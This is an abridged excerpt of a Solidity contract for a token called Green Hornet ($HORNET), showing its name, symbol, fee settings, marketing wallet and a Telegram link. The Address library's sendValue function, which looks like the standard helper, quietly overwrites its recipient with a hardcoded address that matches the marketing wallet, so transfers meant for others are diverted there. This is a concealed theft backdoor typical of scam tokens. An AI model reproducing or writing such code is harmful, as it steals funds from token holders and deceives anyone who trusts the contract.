...
/**
TELEGRAM : https://t.me/greenhornetcoin
*/
...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0x355F4DaFb16e71228C4e000cEb1e2DD52b36878E);
...
contract GreenHornetCoin is Context, IERC20, Ownable {
    ...
    string private constant _name = "Green Hornet"; // 
    string private constant _symbol = "$HORNET"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 8;
    uint256 private _liquidityFee = 1;
    address private  _marketingWallet = 0x355F4DaFb16e71228C4e000cEb1e2DD52b36878E;
